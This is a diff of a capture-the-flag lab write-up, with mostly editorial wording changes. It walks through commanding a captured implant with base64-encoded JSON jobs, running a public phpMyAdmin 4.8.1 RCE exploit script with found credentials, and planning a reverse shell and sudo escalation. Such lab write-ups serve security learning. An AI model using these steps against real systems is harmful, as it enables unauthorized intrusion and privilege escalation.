@@ -79,7 +79,7 @@ Soon after starting the server we see calls coming in for the  `heartbeat` endpo
 
 ## Foothold
 
-To begin interacting with the endponit, we'll host a file at `/get-job/ImxhdGVzdCI=` for the implant to pull. 
+To begin interacting with the endponit, we'll host a file at `/get-job/ImxhdGVzdCI=` for the implant to pull. We'll seed it with a `ls` command to start.
 
 ```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
@@ -96,19 +96,19 @@ After a brief wait we see the implant call our file, followed by a second call t
 
 Decoding the base 64 we see `{"success": false, "result": "Encoding error"}`
 
-OK, so it wants base 64. On the next round we send:
+OK, so it wants base 64. On the next round we'll encode the payload:
 
 `echo 'ls' | base64 > get-job/ImxhdGVzdCI=`
 
-and get back:
+The implant reads this and returns:
 
 `{"success": false, "result": "JSON error"}`
 
-Let’s try the JSON format we received in the heartbeat message. We submit:
+Now it wants JSON. At least we're moving forward! Let’s try the JSON format we received in the heartbeat message. We submit:
 
 `echo '{"job_id": 0, "cmd": "ls"}' | base64 > get-job/ImxhdGVzdCI=`
 
-and get back:
+With this we get back:
 
 `{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}`
 
@@ -326,11 +326,11 @@ We seem to have run out of likely paths to become fi, let’s look for another o
 
 Running `curl 127.0.0.1` we see phpMyAdmin version 4.8.1 on port 80. 
 
-There are (at least) two paths we can take from here.
+There are (at least) two paths we can take from here, lets examine both.
 
 ### Intended Path
 
-A quick search identifies an RCE for this version of phpMyAdmin. 
+A quick search identifies an RCE for our version of phpMyAdmin. 
 
 ```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
@@ -350,12 +350,12 @@ Shellcodes: No Results
 
 We upload the exploit file and run it with the credentials that we found in ada's python file earlier. 
 ```bash
-ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app s4Ucbrme id
+ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app [redacted] id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
 
-The exploit seems to work. We can upload our shell of choice and call it with this script to obtain a new shell as www-data.
+The exploit seems to work. We can upload or `cat` our reverse shell of choice and call it with this script to obtain a new shell as www-data.
 
 ### Alternate Path
 
@@ -421,7 +421,7 @@ With the above we receive a connection back to our new listener as www-data.
 
 ## Become root
 
-A quick enumeration proves that our migration to www-data was worthwile:
+A quick enumeration proves that our migration to www-data was worthwile, this account has full `sudo` permissions with no password needed. 
 
 ```bash
 $ sudo -l
